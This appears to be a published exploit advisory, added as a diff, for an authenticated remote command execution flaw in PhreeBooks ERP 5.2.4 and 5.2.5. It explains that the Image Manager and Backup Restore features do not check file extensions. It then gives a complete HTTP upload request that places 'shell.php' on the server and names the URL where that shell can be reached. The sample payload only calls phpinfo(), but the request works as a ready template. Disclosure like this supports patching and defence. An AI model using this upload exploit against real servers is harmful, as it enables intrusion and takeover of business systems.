@@ -1,0 +1,50 @@
+# Exploit Title: PhreeBooks ERP 5.2.5 - Remote Command Execution
+# Date: 2020-05-01
+# Author: Besim ALTINOK
+# Vendor Homepage: https://www.phreesoft.com/
+# Software Link: https://sourceforge.net/projects/phreebooks/
+# Version: v5.2.4, v5.2.5
+# Tested on: Xampp
+# Credit: İsmail BOZKURT
+
+-------------------------------------------------------------------------------------
+
+There are no file extension controls on Image Manager (5.2.4) and on Backup
+Restore. If an authorized user is obtained, it is possible to run a
+malicious PHP file on the server.
+--------------------------------------------------------------------------------------
+
+One of the Vulnerable File: (backup.php)
+-----------------------------------------
+
+RCE PoC (Upload Process)
+--------------------------------------------------------------------------------------
+
+POST /pblast/index.php?&p=bizuno/backup/uploadRestore HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 *********************
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-GB,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://localhost/pblast/index.php?&p=bizuno/backup/managerRestore
+X-Requested-With: XMLHttpRequest
+Content-Type: multipart/form-data;
+boundary=---------------------------39525038724866743160620170
+Content-Length: 231
+DNT: 1
+Connection: close
+Cookie: **************************************************
+
+-----------------------------39525038724866743160620170
+Content-Disposition: form-data; name="fldFile"; filename="shell.php"
+Content-Type: text/php
+
+<? phpinfo(); ?>
+
+-----------------------------39525038724866743160620170--
+
+
+
+Shell directory:
+-------------------------------
+- http://localhost/pblast/myFiles/backups/shell.php
